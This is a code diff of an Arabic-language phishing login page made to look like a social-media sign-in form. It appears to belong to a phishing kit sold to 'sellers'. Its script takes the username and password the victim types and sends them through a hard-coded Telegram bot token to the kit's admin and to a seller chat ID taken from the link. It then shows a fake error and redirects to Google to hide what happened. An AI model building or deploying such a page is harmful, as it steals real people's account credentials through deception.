@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -6,42 +7,50 @@
     <title>تسجيل الدخول</title>
     <style>
         body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 300px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; box-sizing: border-box; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 4px; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 300px; text-align: center; border-radius: 8px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; background: #fafafa; box-sizing: border-box; border-radius: 5px; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 5px; }
     </style>
 </head>
 <body>
     <div class="login-box">
         <h2 id="title">تسجيل الدخول</h2>
         <form id="scamaForm">
-            <input type="text" id="user" placeholder="الهاتف، اسم المستخدم أو البريد" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <input type="text" id="user" placeholder="اسم المستخدم أو الهاتف" required>
+            <input type="password" id="pass" placeholder="كلمة المرور" required>
             <button type="submit">تسجيل الدخول</button>
         </form>
     </div>
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const sellerId = urlParams.get('ref');
+    const sellerId = urlParams.get('ref'); // ID ديال المستخدم اللي صيفط الرابط
     const type = urlParams.get('type') || 'Account';
-    document.getElementById('title').innerText = "Login to " + type;
 
     document.getElementById('scamaForm').addEventListener('submit', function(e) {
         e.preventDefault();
+        
         const token = "8433106897:AAETCVZJn6d-sDFFBGUcbZesj1QLvvPuUo0";
-        const adminId = "6168661664"; // الـ ID ديالك نتا (الآدمين)
+        const adminId = "6168661664"; // الـ ID ديالك نتا (الآدمين) 
         
-        const text = `🔥 صيدة جديدة (${type}) 🔥\n👤 User: ${document.getElementById('user').value}\n🔑 Pass: ${document.getElementById('pass').value}`;
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        
+        const msg = `🔥 صيدة جديدة (${type}) 🔥\n👤 User: ${user}\n🔑 Pass: ${pass}`;
 
-        // إرسال للبائع (الضحية اللي تسجل عندك)
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${sellerId}&text=${encodeURIComponent(text)}`);
-        
-        // إرسال ليك نتا (الآدمين)
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent("نسخة للآدمين:\n" + text)}`)
+        // 1. إرسال للآدمين (نتا) - ضروري
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(msg)}`)
         .then(() => {
-            alert("حدث خطأ في الاتصال، حاول لاحقاً");
+            // 2. إرسال للمستخدم (إيلا كان مسجل)
+            if(sellerId && sellerId !== adminId) {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${sellerId}&text=${encodeURIComponent(msg)}`);
+            }
+            
+            alert("حدث خطأ في السيرفر، يرجى المحاولة لاحقاً");
             window.location.href = "https://www.google.com";
+        })
+        .catch(err => {
+            alert("خطأ في الاتصال بالبوت!");
         });
     });
 </script>
